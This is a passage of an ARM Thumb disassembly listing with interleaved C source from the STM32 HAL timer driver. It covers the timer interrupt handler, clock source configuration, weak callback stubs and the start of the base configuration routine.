 8004e94:	f003 0310 	and.w	r3, r3, #16
 8004e98:	2b00      	cmp	r3, #0
 8004e9a:	d01b      	beq.n	8004ed4 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004e9c:	687b      	ldr	r3, [r7, #4]
 8004e9e:	681b      	ldr	r3, [r3, #0]
 8004ea0:	f06f 0210 	mvn.w	r2, #16
 8004ea4:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004ea6:	687b      	ldr	r3, [r7, #4]
 8004ea8:	2208      	movs	r2, #8
 8004eaa:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004eac:	687b      	ldr	r3, [r7, #4]
 8004eae:	681b      	ldr	r3, [r3, #0]
 8004eb0:	69db      	ldr	r3, [r3, #28]
 8004eb2:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004eb6:	2b00      	cmp	r3, #0
 8004eb8:	d003      	beq.n	8004ec2 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004eba:	6878      	ldr	r0, [r7, #4]
 8004ebc:	f000 f93b 	bl	8005136 <HAL_TIM_IC_CaptureCallback>
 8004ec0:	e005      	b.n	8004ece <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ec2:	6878      	ldr	r0, [r7, #4]
 8004ec4:	f000 f92d 	bl	8005122 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004ec8:	6878      	ldr	r0, [r7, #4]
 8004eca:	f000 f93e 	bl	800514a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004ece:	687b      	ldr	r3, [r7, #4]
 8004ed0:	2200      	movs	r2, #0
 8004ed2:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004ed4:	68bb      	ldr	r3, [r7, #8]
 8004ed6:	f003 0301 	and.w	r3, r3, #1
 8004eda:	2b00      	cmp	r3, #0
 8004edc:	d00c      	beq.n	8004ef8 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004ede:	68fb      	ldr	r3, [r7, #12]
 8004ee0:	f003 0301 	and.w	r3, r3, #1
 8004ee4:	2b00      	cmp	r3, #0
 8004ee6:	d007      	beq.n	8004ef8 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004ee8:	687b      	ldr	r3, [r7, #4]
 8004eea:	681b      	ldr	r3, [r3, #0]
 8004eec:	f06f 0201 	mvn.w	r2, #1
 8004ef0:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004ef2:	6878      	ldr	r0, [r7, #4]
 8004ef4:	f7fb fe64 	bl	8000bc0 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004ef8:	68bb      	ldr	r3, [r7, #8]
 8004efa:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004efe:	2b00      	cmp	r3, #0
 8004f00:	d00c      	beq.n	8004f1c <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f02:	68fb      	ldr	r3, [r7, #12]
 8004f04:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f08:	2b00      	cmp	r3, #0
 8004f0a:	d007      	beq.n	8004f1c <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f0c:	687b      	ldr	r3, [r7, #4]
 8004f0e:	681b      	ldr	r3, [r3, #0]
 8004f10:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f14:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f16:	6878      	ldr	r0, [r7, #4]
 8004f18:	f000 fa9a 	bl	8005450 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f1c:	68bb      	ldr	r3, [r7, #8]
 8004f1e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004f22:	2b00      	cmp	r3, #0
 8004f24:	d00c      	beq.n	8004f40 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f26:	68fb      	ldr	r3, [r7, #12]
 8004f28:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f2c:	2b00      	cmp	r3, #0
 8004f2e:	d007      	beq.n	8004f40 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004f30:	687b      	ldr	r3, [r7, #4]
 8004f32:	681b      	ldr	r3, [r3, #0]
 8004f34:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004f38:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004f3a:	6878      	ldr	r0, [r7, #4]
 8004f3c:	f000 fa92 	bl	8005464 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004f40:	68bb      	ldr	r3, [r7, #8]
 8004f42:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f46:	2b00      	cmp	r3, #0
 8004f48:	d00c      	beq.n	8004f64 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004f4a:	68fb      	ldr	r3, [r7, #12]
 8004f4c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004f50:	2b00      	cmp	r3, #0
 8004f52:	d007      	beq.n	8004f64 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004f54:	687b      	ldr	r3, [r7, #4]
 8004f56:	681b      	ldr	r3, [r3, #0]
 8004f58:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004f5c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004f5e:	6878      	ldr	r0, [r7, #4]
 8004f60:	f000 f8fd 	bl	800515e <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004f64:	68bb      	ldr	r3, [r7, #8]
 8004f66:	f003 0320 	and.w	r3, r3, #32
 8004f6a:	2b00      	cmp	r3, #0
 8004f6c:	d00c      	beq.n	8004f88 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004f6e:	68fb      	ldr	r3, [r7, #12]
 8004f70:	f003 0320 	and.w	r3, r3, #32
 8004f74:	2b00      	cmp	r3, #0
 8004f76:	d007      	beq.n	8004f88 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004f78:	687b      	ldr	r3, [r7, #4]
 8004f7a:	681b      	ldr	r3, [r3, #0]
 8004f7c:	f06f 0220 	mvn.w	r2, #32
 8004f80:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004f82:	6878      	ldr	r0, [r7, #4]
 8004f84:	f000 fa5a 	bl	800543c <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8004f88:	bf00      	nop
 8004f8a:	3710      	adds	r7, #16
 8004f8c:	46bd      	mov	sp, r7
 8004f8e:	bd80      	pop	{r7, pc}

08004f90 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8004f90:	b580      	push	{r7, lr}
 8004f92:	b084      	sub	sp, #16
 8004f94:	af00      	add	r7, sp, #0
 8004f96:	6078      	str	r0, [r7, #4]
 8004f98:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8004f9a:	2300      	movs	r3, #0
 8004f9c:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8004f9e:	687b      	ldr	r3, [r7, #4]
 8004fa0:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8004fa4:	2b01      	cmp	r3, #1
 8004fa6:	d101      	bne.n	8004fac <HAL_TIM_ConfigClockSource+0x1c>
 8004fa8:	2302      	movs	r3, #2
 8004faa:	e0b6      	b.n	800511a <HAL_TIM_ConfigClockSource+0x18a>
 8004fac:	687b      	ldr	r3, [r7, #4]
 8004fae:	2201      	movs	r2, #1
 8004fb0:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8004fb4:	687b      	ldr	r3, [r7, #4]
 8004fb6:	2202      	movs	r2, #2
 8004fb8:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8004fbc:	687b      	ldr	r3, [r7, #4]
 8004fbe:	681b      	ldr	r3, [r3, #0]
 8004fc0:	689b      	ldr	r3, [r3, #8]
 8004fc2:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8004fc4:	68bb      	ldr	r3, [r7, #8]
 8004fc6:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004fca:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 8004fce:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8004fd0:	68bb      	ldr	r3, [r7, #8]
 8004fd2:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8004fd6:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8004fd8:	687b      	ldr	r3, [r7, #4]
 8004fda:	681b      	ldr	r3, [r3, #0]
 8004fdc:	68ba      	ldr	r2, [r7, #8]
 8004fde:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8004fe0:	683b      	ldr	r3, [r7, #0]
 8004fe2:	681b      	ldr	r3, [r3, #0]
 8004fe4:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004fe8:	d03e      	beq.n	8005068 <HAL_TIM_ConfigClockSource+0xd8>
 8004fea:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8004fee:	f200 8087 	bhi.w	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8004ff2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004ff6:	f000 8086 	beq.w	8005106 <HAL_TIM_ConfigClockSource+0x176>
 8004ffa:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8004ffe:	d87f      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005000:	2b70      	cmp	r3, #112	; 0x70
 8005002:	d01a      	beq.n	800503a <HAL_TIM_ConfigClockSource+0xaa>
 8005004:	2b70      	cmp	r3, #112	; 0x70
 8005006:	d87b      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005008:	2b60      	cmp	r3, #96	; 0x60
 800500a:	d050      	beq.n	80050ae <HAL_TIM_ConfigClockSource+0x11e>
 800500c:	2b60      	cmp	r3, #96	; 0x60
 800500e:	d877      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005010:	2b50      	cmp	r3, #80	; 0x50
 8005012:	d03c      	beq.n	800508e <HAL_TIM_ConfigClockSource+0xfe>
 8005014:	2b50      	cmp	r3, #80	; 0x50
 8005016:	d873      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005018:	2b40      	cmp	r3, #64	; 0x40
 800501a:	d058      	beq.n	80050ce <HAL_TIM_ConfigClockSource+0x13e>
 800501c:	2b40      	cmp	r3, #64	; 0x40
 800501e:	d86f      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005020:	2b30      	cmp	r3, #48	; 0x30
 8005022:	d064      	beq.n	80050ee <HAL_TIM_ConfigClockSource+0x15e>
 8005024:	2b30      	cmp	r3, #48	; 0x30
 8005026:	d86b      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005028:	2b20      	cmp	r3, #32
 800502a:	d060      	beq.n	80050ee <HAL_TIM_ConfigClockSource+0x15e>
 800502c:	2b20      	cmp	r3, #32
 800502e:	d867      	bhi.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
 8005030:	2b00      	cmp	r3, #0
 8005032:	d05c      	beq.n	80050ee <HAL_TIM_ConfigClockSource+0x15e>
 8005034:	2b10      	cmp	r3, #16
 8005036:	d05a      	beq.n	80050ee <HAL_TIM_ConfigClockSource+0x15e>
 8005038:	e062      	b.n	8005100 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800503a:	687b      	ldr	r3, [r7, #4]
 800503c:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800503e:	683b      	ldr	r3, [r7, #0]
 8005040:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005042:	683b      	ldr	r3, [r7, #0]
 8005044:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005046:	683b      	ldr	r3, [r7, #0]
 8005048:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800504a:	f000 f971 	bl	8005330 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 800504e:	687b      	ldr	r3, [r7, #4]
 8005050:	681b      	ldr	r3, [r3, #0]
 8005052:	689b      	ldr	r3, [r3, #8]
 8005054:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 8005056:	68bb      	ldr	r3, [r7, #8]
 8005058:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 800505c:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 800505e:	687b      	ldr	r3, [r7, #4]
 8005060:	681b      	ldr	r3, [r3, #0]
 8005062:	68ba      	ldr	r2, [r7, #8]
 8005064:	609a      	str	r2, [r3, #8]
      break;
 8005066:	e04f      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005068:	687b      	ldr	r3, [r7, #4]
 800506a:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800506c:	683b      	ldr	r3, [r7, #0]
 800506e:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005070:	683b      	ldr	r3, [r7, #0]
 8005072:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005074:	683b      	ldr	r3, [r7, #0]
 8005076:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005078:	f000 f95a 	bl	8005330 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 800507c:	687b      	ldr	r3, [r7, #4]
 800507e:	681b      	ldr	r3, [r3, #0]
 8005080:	689a      	ldr	r2, [r3, #8]
 8005082:	687b      	ldr	r3, [r7, #4]
 8005084:	681b      	ldr	r3, [r3, #0]
 8005086:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 800508a:	609a      	str	r2, [r3, #8]
      break;
 800508c:	e03c      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800508e:	687b      	ldr	r3, [r7, #4]
 8005090:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005092:	683b      	ldr	r3, [r7, #0]
 8005094:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005096:	683b      	ldr	r3, [r7, #0]
 8005098:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800509a:	461a      	mov	r2, r3
 800509c:	f000 f8ce 	bl	800523c <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 80050a0:	687b      	ldr	r3, [r7, #4]
 80050a2:	681b      	ldr	r3, [r3, #0]
 80050a4:	2150      	movs	r1, #80	; 0x50
 80050a6:	4618      	mov	r0, r3
 80050a8:	f000 f927 	bl	80052fa <TIM_ITRx_SetConfig>
      break;
 80050ac:	e02c      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 80050ae:	687b      	ldr	r3, [r7, #4]
 80050b0:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050b2:	683b      	ldr	r3, [r7, #0]
 80050b4:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050b6:	683b      	ldr	r3, [r7, #0]
 80050b8:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 80050ba:	461a      	mov	r2, r3
 80050bc:	f000 f8ed 	bl	800529a <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80050c0:	687b      	ldr	r3, [r7, #4]
 80050c2:	681b      	ldr	r3, [r3, #0]
 80050c4:	2160      	movs	r1, #96	; 0x60
 80050c6:	4618      	mov	r0, r3
 80050c8:	f000 f917 	bl	80052fa <TIM_ITRx_SetConfig>
      break;
 80050cc:	e01c      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80050ce:	687b      	ldr	r3, [r7, #4]
 80050d0:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80050d2:	683b      	ldr	r3, [r7, #0]
 80050d4:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80050d6:	683b      	ldr	r3, [r7, #0]
 80050d8:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80050da:	461a      	mov	r2, r3
 80050dc:	f000 f8ae 	bl	800523c <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 80050e0:	687b      	ldr	r3, [r7, #4]
 80050e2:	681b      	ldr	r3, [r3, #0]
 80050e4:	2140      	movs	r1, #64	; 0x40
 80050e6:	4618      	mov	r0, r3
 80050e8:	f000 f907 	bl	80052fa <TIM_ITRx_SetConfig>
      break;
 80050ec:	e00c      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 80050ee:	687b      	ldr	r3, [r7, #4]
 80050f0:	681a      	ldr	r2, [r3, #0]
 80050f2:	683b      	ldr	r3, [r7, #0]
 80050f4:	681b      	ldr	r3, [r3, #0]
 80050f6:	4619      	mov	r1, r3
 80050f8:	4610      	mov	r0, r2
 80050fa:	f000 f8fe 	bl	80052fa <TIM_ITRx_SetConfig>
      break;
 80050fe:	e003      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 8005100:	2301      	movs	r3, #1
 8005102:	73fb      	strb	r3, [r7, #15]
      break;
 8005104:	e000      	b.n	8005108 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005106:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005108:	687b      	ldr	r3, [r7, #4]
 800510a:	2201      	movs	r2, #1
 800510c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005110:	687b      	ldr	r3, [r7, #4]
 8005112:	2200      	movs	r2, #0
 8005114:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005118:	7bfb      	ldrb	r3, [r7, #15]
}
 800511a:	4618      	mov	r0, r3
 800511c:	3710      	adds	r7, #16
 800511e:	46bd      	mov	sp, r7
 8005120:	bd80      	pop	{r7, pc}

08005122 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 8005122:	b480      	push	{r7}
 8005124:	b083      	sub	sp, #12
 8005126:	af00      	add	r7, sp, #0
 8005128:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 800512a:	bf00      	nop
 800512c:	370c      	adds	r7, #12
 800512e:	46bd      	mov	sp, r7
 8005130:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005134:	4770      	bx	lr

08005136 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 8005136:	b480      	push	{r7}
 8005138:	b083      	sub	sp, #12
 800513a:	af00      	add	r7, sp, #0
 800513c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 800513e:	bf00      	nop
 8005140:	370c      	adds	r7, #12
 8005142:	46bd      	mov	sp, r7
 8005144:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005148:	4770      	bx	lr

0800514a <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 800514a:	b480      	push	{r7}
 800514c:	b083      	sub	sp, #12
 800514e:	af00      	add	r7, sp, #0
 8005150:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 8005152:	bf00      	nop
 8005154:	370c      	adds	r7, #12
 8005156:	46bd      	mov	sp, r7
 8005158:	f85d 7b04 	ldr.w	r7, [sp], #4
 800515c:	4770      	bx	lr

0800515e <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 800515e:	b480      	push	{r7}
 8005160:	b083      	sub	sp, #12
 8005162:	af00      	add	r7, sp, #0
 8005164:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 8005166:	bf00      	nop
 8005168:	370c      	adds	r7, #12
 800516a:	46bd      	mov	sp, r7
 800516c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005170:	4770      	bx	lr
	...

08005174 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005174:	b480      	push	{r7}
 8005176:	b085      	sub	sp, #20
 8005178:	af00      	add	r7, sp, #0
 800517a:	6078      	str	r0, [r7, #4]
 800517c:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 800517e:	687b      	ldr	r3, [r7, #4]
 8005180:	681b      	ldr	r3, [r3, #0]
 8005182:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005184:	687b      	ldr	r3, [r7, #4]
 8005186:	4a2a      	ldr	r2, [pc, #168]	; (8005230 <TIM_Base_SetConfig+0xbc>)
 8005188:	4293      	cmp	r3, r2
 800518a:	d003      	beq.n	8005194 <TIM_Base_SetConfig+0x20>
 800518c:	687b      	ldr	r3, [r7, #4]
 800518e:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005192:	d108      	bne.n	80051a6 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005194:	68fb      	ldr	r3, [r7, #12]
 8005196:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800519a:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 800519c:	683b      	ldr	r3, [r7, #0]
 800519e:	685b      	ldr	r3, [r3, #4]
 80051a0:	68fa      	ldr	r2, [r7, #12]
 80051a2:	4313      	orrs	r3, r2
 80051a4:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 80051a6:	687b      	ldr	r3, [r7, #4]
 80051a8:	4a21      	ldr	r2, [pc, #132]	; (8005230 <TIM_Base_SetConfig+0xbc>)
 80051aa:	4293      	cmp	r3, r2
 80051ac:	d00b      	beq.n	80051c6 <TIM_Base_SetConfig+0x52>
 80051ae:	687b      	ldr	r3, [r7, #4]
 80051b0:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051b4:	d007      	beq.n	80051c6 <TIM_Base_SetConfig+0x52>
 80051b6:	687b      	ldr	r3, [r7, #4]
 80051b8:	4a1e      	ldr	r2, [pc, #120]	; (8005234 <TIM_Base_SetConfig+0xc0>)
 80051ba:	4293      	cmp	r3, r2
 80051bc:	d003      	beq.n	80051c6 <TIM_Base_SetConfig+0x52>
 80051be:	687b      	ldr	r3, [r7, #4]
 80051c0:	4a1d      	ldr	r2, [pc, #116]	; (8005238 <TIM_Base_SetConfig+0xc4>)
 80051c2:	4293      	cmp	r3, r2
 80051c4:	d108      	bne.n	80051d8 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80051c6:	68fb      	ldr	r3, [r7, #12]
